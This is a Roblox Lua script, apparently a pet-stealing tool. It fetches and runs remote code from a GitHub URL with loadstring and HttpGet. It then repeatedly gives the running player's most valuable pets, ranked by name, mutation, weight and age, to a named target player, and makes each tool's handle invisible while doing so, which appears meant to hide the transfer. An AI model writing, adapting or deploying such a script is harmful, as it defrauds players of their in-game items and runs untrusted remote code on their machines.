-- Load settings
local Settings = loadstring(game:HttpGet("https://raw.githubusercontent.com/unblock-eve/files/refs/heads/main/SETTINGS.lua"))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Player reference
local localPlayer = Players.LocalPlayer

-- Helper function to wait
local function wait(duration)
    local start = tick()
    repeat
        RunService.Heartbeat:Wait()
    until tick() - start >= duration
end

-- Function to delete tool handle (makes it invisible but keeps functionality)
local function deleteToolHandle(tool)
    if tool and tool:FindFirstChild("Handle") then
        tool.Handle.Transparency = 1
        tool.Handle.CanCollide = false
        
        -- Hide any mesh or special part children
        for _, child in pairs(tool.Handle:GetChildren()) do
            if child:IsA("SpecialMesh") or child:IsA("BlockMesh") then
                child.Scale = Vector3.new(0, 0, 0)
            elseif child:IsA("Decal") or child:IsA("Texture") then
                child.Transparency = 1
            end
        end
        
        print(string.format("🔧 Deleted handle for tool: %s", tool.Name))
        return true
    end
    return false
end

-- Function to equip pet tool
local function equipPetTool(tool)
    if not tool or not tool.Parent then
        print("❌ Tool is nil or not in backpack")
        return false
    end
    
    local success, result = pcall(function()
        local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid:EquipTool(tool)
            return true
        end
        return false
    end)
    
    if success and result then
        print(string.format("✅ Successfully equipped tool: %s", tool.Name))
        return true
    else
        print(string.format("❌ Failed to equip tool: %s", tool.Name))
        return false
    end
end

-- Function to unequip pet tool
local function unequipPetTool(tool)
    if not tool then return false end
    
    local success, result = pcall(function()
        if tool.Parent == localPlayer.Character then
            tool.Parent = localPlayer.Backpack
            return true
        end
        return false
    end)
    
    if success and result then
        print(string.format("✅ Successfully unequipped tool: %s", tool.Name))
        return true
    else
        print(string.format("❌ Failed to unequip tool: %s", tool.Name))
        return false
    end
end

-- Function to send gifting remote
local function sendGiftingRemote(petUUID, targetPlayer)
    local args = {
        "GiftPet",
        targetPlayer, -- Target player name
        petUUID       -- Pet UUID to gift
    }
    
    local success, result = pcall(function()
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer(unpack(args))
    end)
    
    if success then
        print(string.format("✅ Successfully sent gift remote for pet UUID: %s to %s", petUUID, targetPlayer))
        return true
    else
        print(string.format("❌ Failed to send gift remote for pet %s: %s", petUUID, tostring(result)))
        return false
    end
end

-- Function to get valid pet tools from backpack based on UUIDs from main script
local function getValidPetToolsFromData(validPetsData)
    local validTools = {}
    local backpack = localPlayer.Backpack
    
    if not backpack then
        print("❌ Backpack not found")
        return validTools
    end
    
    -- Create a lookup table of valid UUIDs from all priorities
    local validUUIDs = {}
    for priority, pets in pairs(validPetsData) do
        for _, petData in ipairs(pets) do
            if petData.pet and petData.pet.uuid then
                validUUIDs[petData.pet.uuid] = {
                    priority = priority,
                    petData = petData
                }
            end
        end
    end
    
    -- Find tools in backpack that match valid UUIDs
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") then
            local petUUID = tool:GetAttribute("PET_UUID")
            
            if validUUIDs[petUUID] then
                table.insert(validTools, {
                    tool = tool,
                    uuid = petUUID,
                    priority = validUUIDs[petUUID].priority,
                    petData = validUUIDs[petUUID].petData
                })
            end
        end
    end
    
    -- Sort by priority (NAME > MUTATION > WEIGHT > AGE)
    local priorityOrder = {NAME = 1, MUTATION = 2, WEIGHT = 3, AGE = 4}
    table.sort(validTools, function(a, b)
        return priorityOrder[a.priority] < priorityOrder[b.priority]
    end)
    
    return validTools
end

-- Main gifting function
local function processGifting(validPetsData, targetPlayerName)
    print("=== STARTING PET GIFTING PROCESS ===")
    
    local cycle = 1
    
    while true do
        print(string.format("\n--- CYCLE %d ---", cycle))
        
        -- Get current valid tools from backpack
        local validTools = getValidPetToolsFromData(validPetsData)
        
        if #validTools == 0 then
            print("✅ No more valid pet tools found in backpack. Gifting complete!")
            break
        end
        
        print(string.format("Found %d valid pet tools to process", #validTools))
        
        -- Process each valid tool
        for i, toolData in ipairs(validTools) do
            local tool = toolData.tool
            local petUUID = toolData.uuid
            local priority = toolData.priority
            
            print(string.format("\nProcessing %d/%d: %s (Priority: %s, UUID: %s)", 
                i, #validTools, tool.Name, priority, petUUID))
            
            -- Step 1: Delete tool handle
            deleteToolHandle(tool)
            wait(0.2)
            
            -- Step 2: Equip the tool
            if equipPetTool(tool) then
                wait(0.5) -- Wait for equip to register
                
                -- Step 3: Send gifting remote
                sendGiftingRemote(petUUID, targetPlayerName)
                wait(0.3)
                
                -- Step 4: Unequip the tool
                unequipPetTool(tool)
                wait(0.2)
            else
                print(string.format("❌ Skipping gift for %s due to equip failure", tool.Name))
            end
            
            -- Small delay between pets
            wait(0.5)
        end
        
        cycle = cycle + 1
        
        -- Wait 5 seconds before next cycle
        print(string.format("\n⏳ Waiting 5 seconds before cycle %d...", cycle))
        wait(5)
    end
    
    print("\n=== PET GIFTING PROCESS COMPLETED ===")
end

-- Example usage function (to be called with data from main script)
local function startGiftingProcess(validPetsData, targetPlayerName)
    if not validPetsData then
        print("❌ No valid pets data provided")
        return
    end
    
    if not targetPlayerName then
        print("❌ No target player name provided")
        return
    end
    
    -- Start the gifting process
    processGifting(validPetsData, targetPlayerName)
end

-- Export the main function
_G.startGiftingProcess = startGiftingProcess

print("🚀 Pet Gifting Script Loaded!")
print("Usage: _G.startGiftingProcess(validPetsData, targetPlayerName)")
print("Example: _G.startGiftingProcess(validPets, 'PlayerName')")
